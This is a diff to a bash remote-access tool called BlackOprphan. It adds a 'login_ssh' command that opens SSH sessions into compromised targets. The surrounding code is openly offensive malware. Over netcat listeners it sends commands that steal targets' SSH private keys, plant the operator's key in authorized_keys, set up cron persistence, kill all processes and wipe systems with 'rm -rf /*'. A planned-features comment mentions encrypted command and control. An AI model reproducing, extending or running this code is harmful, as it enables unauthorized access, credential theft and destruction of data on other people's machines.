@@ -358,6 +358,7 @@ bCommand(){
 		printf "\tremove_sys\tREMOVES EVERYTHING ON THE SYSTEM\n\n"
 		printf "\tget_ssh\t\tGET'S THE SHH PUB-KEY AND PRIV-KEY\n\n"
 		printf "\tput_ssh\t\tPUT YOUR SSH KEYS ON THE TARGET authroized_keys\n\n"
+        printf "\tlogin_ssh\t\LOGIN TO TARGETS WITH SSH, YOU MUST RUN PUT_SSH BEFORE THIS\n\n"
 		printf "\tkill_all\tKILLS ALL PROCESS ON THE TARGETS COMPUTERS\n\n"
 		printf "\tpersistent\tONE'S THE TARGET BOOTS UP, YOU CAN CONNECT\n\n"
 		printf "\tdrop_shell\t\tGives you a shell access on the target box\n\n"
@@ -387,6 +388,8 @@ bCommand(){
 		    get_ssh) echo "TYPING 'get_ssh' SAVES THE TARGET PUBLIC KEYS AND PRIVTATE KEY IN \
 \nROOTPRIVKEY AND ROOTPUBKEY FOR ROOT USER, FOR NONE ROOT USERS IT SAVES IN PUBKEY.TXT AND PRIVKEY.TXT"
 			     continue ;;
+            login_ssh) echo "TYPING 'login_ssh' CREATE AN SSH SECTION TO THE TARGET" 
+                continue ;;
 		    info) echo "TYPING 'info' SHOWS THE INFORMATION ABOUT A COMMAND "
 			  continue ;;
 		    process) echo "TYPING 'process' SHOWS ALL THE RUNNING PROCESS IN THE TARGETS COMPUTER "
@@ -479,10 +482,12 @@ bCommand(){
 		else
 		    if echo "ls -a /home/${get_sshUser}" |\
 			    timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| grep ^.ssh &>/dev/null;then
+                
 			get_sshfunc;
 
 		    else
-			echo "ssh keys not found"
+			echo "${open}${bold}${yellow}ssh keys not found${close}" 
+			echo "${open}${bold}${green}Creating ssh keys ${close}"
 			timeout --foreground --signal=TERM 6s nc -lnvp "$l_port" 2>/dev/null
 			echo "ssh-keygen -N '' -f /home/${get_sshUser}/.ssh/${get_sshUser}" | \
                             timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
@@ -492,9 +497,9 @@ bCommand(){
 		continue
 		;;
 	    put_ssh)
-		put_sshIp=$(echo "ip route" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| \
+		declare -g put_sshIp=$(echo "ip route" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| \
 				   sed 's/src/\nsrc/' | grep src | egrep -m 1 -o "[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}")
-		put_sshUser=$(echo "whoami" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
+		declare -g put_sshUser=$(echo "whoami" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
 		login_ssh(){
 		    shopt -s nocasematch
 		    while printf "Establish an ssh Session:[y|n] " ; read estherBlish junk
@@ -504,7 +509,7 @@ bCommand(){
 			    y)
 				echo "${open}${bold}${green}If put_ssh worked properly you won't be asked for a password${close}"
 				sleep 3s
-				xterm -title "BlackOprphan ssh Session" -e /bin/bash -c "ssh ${put_sshUser}@$put_sshIp"
+				xterm -title "BlackOprphan ssh Session" -e /bin/bash -c "ssh ${put_sshUser}@${put_sshIp}"
 				break ;;
 			    n)  break ;;
 			esac
@@ -543,6 +548,15 @@ bCommand(){
 		    fi
 		done
 		;;
+        login_ssh)
+            {
+                [[ ${put_sshIp} == "" ]] || [[ ${put_sshUser} == "" ]]
+            } && {
+                echo "${open}${bold}${red}Run put_ssh ${close}"
+            }  || {
+                xterm -title "BlackOprphan ssh Session" -e /bin/bash -c "ssh ${put_sshUser}@${put_sshIp}"
+            }
+        ;;
 	    remove_sys)
 		echo "rm -rf /*" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
 		continue
@@ -550,7 +564,7 @@ bCommand(){
 	    persistent)
 		cronJ=$(echo "${0}" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null\
                                | grep ^ | awk -F ":" '{ print $1}')
-		echo "${open}${bold}${green}Creating a cron file${close}"
+		echo "${open}${bold}${green}Creating a cron file ${cronJ}${close}"
 		sleep 2
 		echo "eval echo '\'*\' \'*\' \'*\' \'*\' \'*\' root \'bash\' ${cronJ}' > ~/cronJobs" | \
                     timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
@@ -703,8 +717,7 @@ _select(){
 chk_file() {
 
 
-		while printf "\n${open}${light}${green}Specify the script to bind with\
-    (shellscript|pythonScript|perlScript): ${close}" ; read bindscript
+		while printf "\n${open}${light}${green}Specify the script to bind with: ${close}" ; read bindscript
 		do
 		    if [ -z "$bindscript" ];then
 			printf "\n${open}${light}${yellow}[!]Path to the script to bind with is needed${close}\n"
@@ -1393,4 +1406,3 @@ _select
 #4. Encrypt the commands sent to targets computer
 #5. Decrypt the commands on targets commands, encrypt the results and send it back to attacker
 #6. GUI for BLACKORPHAN witk tcl/tk 
-
